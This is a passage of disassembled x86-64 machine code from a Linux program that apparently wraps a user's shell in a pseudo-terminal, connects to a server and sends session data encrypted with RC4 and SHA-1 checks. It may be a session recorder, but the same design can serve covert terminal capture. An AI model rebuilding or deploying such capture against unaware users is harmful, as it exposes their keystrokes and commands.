  401bf6:	48 89 c6             	mov    %rax,%rsi
  401bf9:	48 89 cf             	mov    %rcx,%rdi
  401bfc:	e8 5f f3 ff ff       	callq  400f60 <memcpy@plt>
  401c01:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401c08:	48 89 c7             	mov    %rax,%rdi
  401c0b:	e8 08 14 00 00       	callq  403018 <sha1_starts>
  401c10:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  401c17:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401c1e:	ba 20 00 00 00       	mov    $0x20,%edx
  401c23:	48 89 ce             	mov    %rcx,%rsi
  401c26:	48 89 c7             	mov    %rax,%rdi
  401c29:	e8 c0 55 00 00       	callq  4071ee <sha1_update>
  401c2e:	48 8d 95 a0 de ff ff 	lea    -0x2160(%rbp),%rdx
  401c35:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401c3c:	48 89 d6             	mov    %rdx,%rsi
  401c3f:	48 89 c7             	mov    %rax,%rdi
  401c42:	e8 e5 56 00 00       	callq  40732c <sha1_finish>
  401c47:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  401c4e:	48 8d 85 60 da ff ff 	lea    -0x25a0(%rbp),%rax
  401c55:	ba 14 00 00 00       	mov    $0x14,%edx
  401c5a:	48 89 ce             	mov    %rcx,%rsi
  401c5d:	48 89 c7             	mov    %rax,%rdi
  401c60:	e8 78 59 00 00       	callq  4075dd <rc4_setup>
  401c65:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401c6b:	8d 50 14             	lea    0x14(%rax),%edx
  401c6e:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401c74:	48 98                	cltq   
  401c76:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  401c7d:	48 01 c1             	add    %rax,%rcx
  401c80:	48 8d 85 60 da ff ff 	lea    -0x25a0(%rbp),%rax
  401c87:	48 89 ce             	mov    %rcx,%rsi
  401c8a:	48 89 c7             	mov    %rax,%rdi
  401c8d:	e8 6a 5a 00 00       	callq  4076fc <rc4_crypt>
  401c92:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401c99:	48 89 c7             	mov    %rax,%rdi
  401c9c:	e8 77 13 00 00       	callq  403018 <sha1_starts>
  401ca1:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401ca7:	48 63 d0             	movslq %eax,%rdx
  401caa:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401cb0:	48 98                	cltq   
  401cb2:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  401cb9:	48 01 c1             	add    %rax,%rcx
  401cbc:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401cc3:	48 89 ce             	mov    %rcx,%rsi
  401cc6:	48 89 c7             	mov    %rax,%rdi
  401cc9:	e8 20 55 00 00       	callq  4071ee <sha1_update>
  401cce:	48 8d 95 80 de ff ff 	lea    -0x2180(%rbp),%rdx
  401cd5:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401cdc:	48 89 d6             	mov    %rdx,%rsi
  401cdf:	48 89 c7             	mov    %rax,%rdi
  401ce2:	e8 45 56 00 00       	callq  40732c <sha1_finish>
  401ce7:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401ced:	48 63 d0             	movslq %eax,%rdx
  401cf0:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401cf6:	48 98                	cltq   
  401cf8:	48 01 c2             	add    %rax,%rdx
  401cfb:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  401d02:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
  401d06:	48 8d 85 80 de ff ff 	lea    -0x2180(%rbp),%rax
  401d0d:	ba 14 00 00 00       	mov    $0x14,%edx
  401d12:	48 89 ce             	mov    %rcx,%rsi
  401d15:	48 89 c7             	mov    %rax,%rdi
  401d18:	e8 13 f2 ff ff       	callq  400f30 <memcmp@plt>
  401d1d:	85 c0                	test   %eax,%eax
  401d1f:	74 4b                	je     401d6c <encrypt_and_send+0x7d0>
  401d21:	48 8d 85 70 de ff ff 	lea    -0x2190(%rbp),%rax
  401d28:	48 89 c7             	mov    %rax,%rdi
  401d2b:	e8 55 0f 00 00       	callq  402c85 <pretty_time>
  401d30:	48 8d 85 70 de ff ff 	lea    -0x2190(%rbp),%rax
  401d37:	48 89 c2             	mov    %rax,%rdx
  401d3a:	be c1 78 40 00       	mov    $0x4078c1,%esi
  401d3f:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  401d44:	b8 00 00 00 00       	mov    $0x0,%eax
  401d49:	e8 22 f1 ff ff       	callq  400e70 <printf@plt>
  401d4e:	be a0 7b 40 00       	mov    $0x407ba0,%esi
  401d53:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  401d58:	b8 00 00 00 00       	mov    $0x0,%eax
  401d5d:	e8 0e f1 ff ff       	callq  400e70 <printf@plt>
  401d62:	bf 00 7a 40 00       	mov    $0x407a00,%edi
  401d67:	e8 84 f0 ff ff       	callq  400df0 <puts@plt>
  401d6c:	c7 85 4c da ff ff 00 	movl   $0x0,-0x25b4(%rbp)
  401d73:	00 00 00 
  401d76:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401d7c:	8d 50 01             	lea    0x1(%rax),%edx
  401d7f:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401d85:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401d8b:	01 d0                	add    %edx,%eax
  401d8d:	48 98                	cltq   
  401d8f:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401d96:	ff 
  401d97:	0f b6 c8             	movzbl %al,%ecx
  401d9a:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401da0:	8d 50 01             	lea    0x1(%rax),%edx
  401da3:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401da9:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401daf:	01 d0                	add    %edx,%eax
  401db1:	48 98                	cltq   
  401db3:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401dba:	ff 
  401dbb:	0f b6 c0             	movzbl %al,%eax
  401dbe:	c1 e0 08             	shl    $0x8,%eax
  401dc1:	09 c1                	or     %eax,%ecx
  401dc3:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401dc9:	8d 50 01             	lea    0x1(%rax),%edx
  401dcc:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401dd2:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401dd8:	01 d0                	add    %edx,%eax
  401dda:	48 98                	cltq   
  401ddc:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401de3:	ff 
  401de4:	0f b6 c0             	movzbl %al,%eax
  401de7:	c1 e0 10             	shl    $0x10,%eax
  401dea:	09 c1                	or     %eax,%ecx
  401dec:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401df2:	8d 50 01             	lea    0x1(%rax),%edx
  401df5:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401dfb:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401e01:	01 d0                	add    %edx,%eax
  401e03:	48 98                	cltq   
  401e05:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401e0c:	ff 
  401e0d:	0f b6 c0             	movzbl %al,%eax
  401e10:	c1 e0 18             	shl    $0x18,%eax
  401e13:	09 c8                	or     %ecx,%eax
  401e15:	48 98                	cltq   
  401e17:	48 89 85 80 ef ff ff 	mov    %rax,-0x1080(%rbp)
  401e1e:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401e24:	8d 50 01             	lea    0x1(%rax),%edx
  401e27:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401e2d:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401e33:	01 d0                	add    %edx,%eax
  401e35:	48 98                	cltq   
  401e37:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401e3e:	ff 
  401e3f:	0f b6 c8             	movzbl %al,%ecx
  401e42:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401e48:	8d 50 01             	lea    0x1(%rax),%edx
  401e4b:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401e51:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401e57:	01 d0                	add    %edx,%eax
  401e59:	48 98                	cltq   
  401e5b:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401e62:	ff 
  401e63:	0f b6 c0             	movzbl %al,%eax
  401e66:	c1 e0 08             	shl    $0x8,%eax
  401e69:	09 c1                	or     %eax,%ecx
  401e6b:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401e71:	8d 50 01             	lea    0x1(%rax),%edx
  401e74:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401e7a:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401e80:	01 d0                	add    %edx,%eax
  401e82:	48 98                	cltq   
  401e84:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401e8b:	ff 
  401e8c:	0f b6 c0             	movzbl %al,%eax
  401e8f:	c1 e0 10             	shl    $0x10,%eax
  401e92:	09 c1                	or     %eax,%ecx
  401e94:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401e9a:	8d 50 01             	lea    0x1(%rax),%edx
  401e9d:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401ea3:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401ea9:	01 d0                	add    %edx,%eax
  401eab:	48 98                	cltq   
  401ead:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401eb4:	ff 
  401eb5:	0f b6 c0             	movzbl %al,%eax
  401eb8:	c1 e0 18             	shl    $0x18,%eax
  401ebb:	09 c8                	or     %ecx,%eax
  401ebd:	48 98                	cltq   
  401ebf:	48 89 85 88 ef ff ff 	mov    %rax,-0x1078(%rbp)
  401ec6:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401ecc:	8d 50 01             	lea    0x1(%rax),%edx
  401ecf:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401ed5:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401edb:	01 d0                	add    %edx,%eax
  401edd:	48 98                	cltq   
  401edf:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401ee6:	ff 
  401ee7:	0f b6 c8             	movzbl %al,%ecx
  401eea:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401ef0:	8d 50 01             	lea    0x1(%rax),%edx
  401ef3:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401ef9:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401eff:	01 d0                	add    %edx,%eax
  401f01:	48 98                	cltq   
  401f03:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401f0a:	ff 
  401f0b:	0f b6 c0             	movzbl %al,%eax
  401f0e:	c1 e0 08             	shl    $0x8,%eax
  401f11:	09 c8                	or     %ecx,%eax
  401f13:	89 85 d4 ef ff ff    	mov    %eax,-0x102c(%rbp)
  401f19:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401f1f:	8d 50 01             	lea    0x1(%rax),%edx
  401f22:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401f28:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401f2e:	01 d0                	add    %edx,%eax
  401f30:	48 98                	cltq   
  401f32:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401f39:	ff 
  401f3a:	0f b6 c8             	movzbl %al,%ecx
  401f3d:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401f43:	8d 50 01             	lea    0x1(%rax),%edx
  401f46:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401f4c:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401f52:	01 d0                	add    %edx,%eax
  401f54:	48 98                	cltq   
  401f56:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401f5d:	ff 
  401f5e:	0f b6 c0             	movzbl %al,%eax
  401f61:	c1 e0 08             	shl    $0x8,%eax
  401f64:	09 c8                	or     %ecx,%eax
  401f66:	89 85 d8 ef ff ff    	mov    %eax,-0x1028(%rbp)
  401f6c:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401f72:	8d 50 01             	lea    0x1(%rax),%edx
  401f75:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401f7b:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401f81:	01 d0                	add    %edx,%eax
  401f83:	48 98                	cltq   
  401f85:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401f8c:	ff 
  401f8d:	0f b6 c0             	movzbl %al,%eax
  401f90:	89 85 dc ef ff ff    	mov    %eax,-0x1024(%rbp)
  401f96:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401f9c:	8b 95 54 da ff ff    	mov    -0x25ac(%rbp),%edx
  401fa2:	29 c2                	sub    %eax,%edx
  401fa4:	89 d0                	mov    %edx,%eax
  401fa6:	2b 85 4c da ff ff    	sub    -0x25b4(%rbp),%eax
  401fac:	89 85 e0 ef ff ff    	mov    %eax,-0x1020(%rbp)
  401fb2:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  401fb8:	83 c0 01             	add    $0x1,%eax
  401fbb:	48 98                	cltq   
  401fbd:	48 89 c7             	mov    %rax,%rdi
  401fc0:	e8 fb ef ff ff       	callq  400fc0 <malloc@plt>
  401fc5:	48 89 85 58 da ff ff 	mov    %rax,-0x25a8(%rbp)
  401fcc:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  401fd2:	48 63 d0             	movslq %eax,%rdx
  401fd5:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401fdb:	48 63 c8             	movslq %eax,%rcx
  401fde:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401fe4:	48 98                	cltq   
  401fe6:	48 01 c1             	add    %rax,%rcx
  401fe9:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  401ff0:	48 01 c1             	add    %rax,%rcx
  401ff3:	48 8b 85 58 da ff ff 	mov    -0x25a8(%rbp),%rax
  401ffa:	48 89 ce             	mov    %rcx,%rsi
  401ffd:	48 89 c7             	mov    %rax,%rdi
  402000:	e8 5b ef ff ff       	callq  400f60 <memcpy@plt>
  402005:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  40200b:	48 63 d0             	movslq %eax,%rdx
  40200e:	48 8b 85 58 da ff ff 	mov    -0x25a8(%rbp),%rax
  402015:	48 01 d0             	add    %rdx,%rax
  402018:	c6 00 00             	movb   $0x0,(%rax)
  40201b:	bf 23 7a 40 00       	mov    $0x407a23,%edi
  402020:	e8 cb ed ff ff       	callq  400df0 <puts@plt>
  402025:	48 8b 85 80 ef ff ff 	mov    -0x1080(%rbp),%rax
  40202c:	89 c6                	mov    %eax,%esi
  40202e:	bf 8c 79 40 00       	mov    $0x40798c,%edi
  402033:	b8 00 00 00 00       	mov    $0x0,%eax
  402038:	e8 33 ee ff ff       	callq  400e70 <printf@plt>
  40203d:	48 8b 85 88 ef ff ff 	mov    -0x1078(%rbp),%rax
  402044:	89 c6                	mov    %eax,%esi
  402046:	bf 9b 79 40 00       	mov    $0x40799b,%edi
  40204b:	b8 00 00 00 00       	mov    $0x0,%eax
  402050:	e8 1b ee ff ff       	callq  400e70 <printf@plt>
  402055:	8b 85 d4 ef ff ff    	mov    -0x102c(%rbp),%eax
  40205b:	89 c6                	mov    %eax,%esi
  40205d:	bf aa 79 40 00       	mov    $0x4079aa,%edi
  402062:	b8 00 00 00 00       	mov    $0x0,%eax
  402067:	e8 04 ee ff ff       	callq  400e70 <printf@plt>
  40206c:	8b 85 d8 ef ff ff    	mov    -0x1028(%rbp),%eax
  402072:	89 c6                	mov    %eax,%esi
  402074:	bf b9 79 40 00       	mov    $0x4079b9,%edi
  402079:	b8 00 00 00 00       	mov    $0x0,%eax
  40207e:	e8 ed ed ff ff       	callq  400e70 <printf@plt>
  402083:	8b 85 dc ef ff ff    	mov    -0x1024(%rbp),%eax
  402089:	89 c6                	mov    %eax,%esi
  40208b:	bf c8 79 40 00       	mov    $0x4079c8,%edi
  402090:	b8 00 00 00 00       	mov    $0x0,%eax
  402095:	e8 d6 ed ff ff       	callq  400e70 <printf@plt>
  40209a:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  4020a0:	89 c6                	mov    %eax,%esi
  4020a2:	bf d7 79 40 00       	mov    $0x4079d7,%edi
  4020a7:	b8 00 00 00 00       	mov    $0x0,%eax
  4020ac:	e8 bf ed ff ff       	callq  400e70 <printf@plt>
  4020b1:	bf e6 79 40 00       	mov    $0x4079e6,%edi
  4020b6:	e8 35 ed ff ff       	callq  400df0 <puts@plt>
  4020bb:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  4020c1:	48 63 d0             	movslq %eax,%rdx
  4020c4:	48 8b 85 58 da ff ff 	mov    -0x25a8(%rbp),%rax
  4020cb:	be 00 00 00 00       	mov    $0x0,%esi
  4020d0:	48 89 c7             	mov    %rax,%rdi
  4020d3:	e8 b2 0a 00 00       	callq  402b8a <__print_output>
  4020d8:	48 8b 85 38 da ff ff 	mov    -0x25c8(%rbp),%rax
  4020df:	8b 40 14             	mov    0x14(%rax),%eax
  4020e2:	8d 50 01             	lea    0x1(%rax),%edx
  4020e5:	48 8b 85 38 da ff ff 	mov    -0x25c8(%rbp),%rax
  4020ec:	89 50 14             	mov    %edx,0x14(%rax)
  4020ef:	81 85 40 da ff ff 00 	addl   $0x200,-0x25c0(%rbp)
  4020f6:	02 00 00 
  4020f9:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  402100:	8b 40 60             	mov    0x60(%rax),%eax
  402103:	3b 85 40 da ff ff    	cmp    -0x25c0(%rbp),%eax
  402109:	0f 8f d9 f4 ff ff    	jg     4015e8 <encrypt_and_send+0x4c>
  40210f:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
  402113:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  40211a:	00 00 
  40211c:	74 05                	je     402123 <encrypt_and_send+0xb87>
  40211e:	e8 0d ed ff ff       	callq  400e30 <__stack_chk_fail@plt>
  402123:	48 81 c4 c8 25 00 00 	add    $0x25c8,%rsp
  40212a:	5b                   	pop    %rbx
  40212b:	5d                   	pop    %rbp
  40212c:	c3                   	retq   

000000000040212d <main>:
  40212d:	55                   	push   %rbp
  40212e:	48 89 e5             	mov    %rsp,%rbp
  402131:	48 81 ec 60 12 00 00 	sub    $0x1260,%rsp
  402138:	89 bd ac ed ff ff    	mov    %edi,-0x1254(%rbp)
  40213e:	48 89 b5 a0 ed ff ff 	mov    %rsi,-0x1260(%rbp)
  402145:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  40214c:	00 00 
  40214e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  402152:	31 c0                	xor    %eax,%eax
  402154:	c7 85 c4 ed ff ff 00 	movl   $0x0,-0x123c(%rbp)
  40215b:	00 00 00 
  40215e:	c7 85 c8 ed ff ff 00 	movl   $0x0,-0x1238(%rbp)
  402165:	00 00 00 
  402168:	c7 85 c0 ed ff ff ff 	movl   $0xffffffff,-0x1240(%rbp)
  40216f:	ff ff ff 
  402172:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402178:	89 85 bc ed ff ff    	mov    %eax,-0x1244(%rbp)
  40217e:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402184:	89 85 70 ee ff ff    	mov    %eax,-0x1190(%rbp)
  40218a:	48 8d 95 90 ee ff ff 	lea    -0x1170(%rbp),%rdx
  402191:	48 8b b5 a0 ed ff ff 	mov    -0x1260(%rbp),%rsi
  402198:	8b 85 ac ed ff ff    	mov    -0x1254(%rbp),%eax
  40219e:	b9 00 01 00 00       	mov    $0x100,%ecx
  4021a3:	89 c7                	mov    %eax,%edi
  4021a5:	e8 3e f2 ff ff       	callq  4013e8 <create_real_shell_run_cmd>
  4021aa:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%rbp)
  4021b0:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%rbp)
  4021b7:	74 50                	je     402209 <main+0xdc>
  4021b9:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4021c0:	48 89 c7             	mov    %rax,%rdi
  4021c3:	e8 bd 0a 00 00       	callq  402c85 <pretty_time>
  4021c8:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4021cf:	48 89 c2             	mov    %rax,%rdx
  4021d2:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4021d7:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4021dc:	b8 00 00 00 00       	mov    $0x0,%eax
  4021e1:	e8 8a ec ff ff       	callq  400e70 <printf@plt>
  4021e6:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  4021eb:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  4021f0:	b8 00 00 00 00       	mov    $0x0,%eax
  4021f5:	e8 76 ec ff ff       	callq  400e70 <printf@plt>
  4021fa:	bf 38 7a 40 00       	mov    $0x407a38,%edi
  4021ff:	e8 ec eb ff ff       	callq  400df0 <puts@plt>
  402204:	e9 19 09 00 00       	jmpq   402b22 <main+0x9f5>
  402209:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402210:	48 89 c7             	mov    %rax,%rdi
  402213:	e8 6d 0a 00 00       	callq  402c85 <pretty_time>
  402218:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40221f:	48 89 c2             	mov    %rax,%rdx
  402222:	be 59 7a 40 00       	mov    $0x407a59,%esi
  402227:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  40222c:	b8 00 00 00 00       	mov    $0x0,%eax
  402231:	e8 3a ec ff ff       	callq  400e70 <printf@plt>
  402236:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40223b:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402240:	b8 00 00 00 00       	mov    $0x0,%eax
  402245:	e8 26 ec ff ff       	callq  400e70 <printf@plt>
  40224a:	48 8d 85 90 ee ff ff 	lea    -0x1170(%rbp),%rax
  402251:	48 89 c6             	mov    %rax,%rsi
  402254:	bf 5d 7a 40 00       	mov    $0x407a5d,%edi
  402259:	b8 00 00 00 00       	mov    $0x0,%eax
  40225e:	e8 0d ec ff ff       	callq  400e70 <printf@plt>
  402263:	bf 00 00 00 00       	mov    $0x0,%edi
  402268:	e8 93 eb ff ff       	callq  400e00 <isatty@plt>
  40226d:	85 c0                	test   %eax,%eax
  40226f:	74 26                	je     402297 <main+0x16a>
  402271:	bf 01 00 00 00       	mov    $0x1,%edi
  402276:	e8 85 eb ff ff       	callq  400e00 <isatty@plt>
  40227b:	85 c0                	test   %eax,%eax
  40227d:	74 18                	je     402297 <main+0x16a>
  40227f:	bf 02 00 00 00       	mov    $0x2,%edi
  402284:	e8 77 eb ff ff       	callq  400e00 <isatty@plt>
  402289:	85 c0                	test   %eax,%eax
  40228b:	74 0a                	je     402297 <main+0x16a>
  40228d:	e8 3e ed ff ff       	callq  400fd0 <getlogin@plt>
  402292:	48 85 c0             	test   %rax,%rax
  402295:	75 50                	jne    4022e7 <main+0x1ba>
  402297:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40229e:	48 89 c7             	mov    %rax,%rdi
  4022a1:	e8 df 09 00 00       	callq  402c85 <pretty_time>
  4022a6:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4022ad:	48 89 c2             	mov    %rax,%rdx
  4022b0:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4022b5:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4022ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4022bf:	e8 ac eb ff ff       	callq  400e70 <printf@plt>
  4022c4:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  4022c9:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  4022ce:	b8 00 00 00 00       	mov    $0x0,%eax
  4022d3:	e8 98 eb ff ff       	callq  400e70 <printf@plt>
  4022d8:	bf 70 7a 40 00       	mov    $0x407a70,%edi
  4022dd:	e8 0e eb ff ff       	callq  400df0 <puts@plt>
  4022e2:	e9 3b 08 00 00       	jmpq   402b22 <main+0x9f5>
  4022e7:	48 8d 85 70 ee ff ff 	lea    -0x1190(%rbp),%rax
  4022ee:	48 89 c7             	mov    %rax,%rdi
  4022f1:	e8 02 f0 ff ff       	callq  4012f8 <create_server_connection>
  4022f6:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%rbp)
  4022fc:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%rbp)
  402303:	74 50                	je     402355 <main+0x228>
  402305:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40230c:	48 89 c7             	mov    %rax,%rdi
  40230f:	e8 71 09 00 00       	callq  402c85 <pretty_time>
  402314:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40231b:	48 89 c2             	mov    %rax,%rdx
  40231e:	be c1 78 40 00       	mov    $0x4078c1,%esi
  402323:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  402328:	b8 00 00 00 00       	mov    $0x0,%eax
  40232d:	e8 3e eb ff ff       	callq  400e70 <printf@plt>
  402332:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  402337:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  40233c:	b8 00 00 00 00       	mov    $0x0,%eax
  402341:	e8 2a eb ff ff       	callq  400e70 <printf@plt>
  402346:	bf 98 7a 40 00       	mov    $0x407a98,%edi
  40234b:	e8 a0 ea ff ff       	callq  400df0 <puts@plt>
  402350:	e9 cd 07 00 00       	jmpq   402b22 <main+0x9f5>
  402355:	48 8d b5 c0 ed ff ff 	lea    -0x1240(%rbp),%rsi
  40235c:	48 8d 85 bc ed ff ff 	lea    -0x1244(%rbp),%rax
  402363:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  402369:	b9 00 00 00 00       	mov    $0x0,%ecx
  40236e:	ba 00 00 00 00       	mov    $0x0,%edx
  402373:	48 89 c7             	mov    %rax,%rdi
  402376:	e8 05 ec ff ff       	callq  400f80 <openpty@plt>
  40237b:	85 c0                	test   %eax,%eax
  40237d:	79 5e                	jns    4023dd <main+0x2b0>
  40237f:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402386:	48 89 c7             	mov    %rax,%rdi
  402389:	e8 f7 08 00 00       	callq  402c85 <pretty_time>
  40238e:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402395:	48 89 c2             	mov    %rax,%rdx
  402398:	be c1 78 40 00       	mov    $0x4078c1,%esi
  40239d:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4023a2:	b8 00 00 00 00       	mov    $0x0,%eax
  4023a7:	e8 c4 ea ff ff       	callq  400e70 <printf@plt>
  4023ac:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  4023b1:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  4023b6:	b8 00 00 00 00       	mov    $0x0,%eax
  4023bb:	e8 b0 ea ff ff       	callq  400e70 <printf@plt>
  4023c0:	e8 1b ea ff ff       	callq  400de0 <__errno_location@plt>
  4023c5:	8b 00                	mov    (%rax),%eax
  4023c7:	89 c6                	mov    %eax,%esi
  4023c9:	bf b8 7a 40 00       	mov    $0x407ab8,%edi
  4023ce:	b8 00 00 00 00       	mov    $0x0,%eax
  4023d3:	e8 98 ea ff ff       	callq  400e70 <printf@plt>
  4023d8:	e9 45 07 00 00       	jmpq   402b22 <main+0x9f5>
  4023dd:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4023e3:	89 c7                	mov    %eax,%edi
  4023e5:	e8 f6 eb ff ff       	callq  400fe0 <ttyname@plt>
  4023ea:	48 89 85 d8 ed ff ff 	mov    %rax,-0x1228(%rbp)
  4023f1:	48 83 bd d8 ed ff ff 	cmpq   $0x0,-0x1228(%rbp)
  4023f8:	00 
  4023f9:	75 5e                	jne    402459 <main+0x32c>
  4023fb:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402402:	48 89 c7             	mov    %rax,%rdi
  402405:	e8 7b 08 00 00       	callq  402c85 <pretty_time>
  40240a:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402411:	48 89 c2             	mov    %rax,%rdx
  402414:	be c1 78 40 00       	mov    $0x4078c1,%esi
  402419:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  40241e:	b8 00 00 00 00       	mov    $0x0,%eax
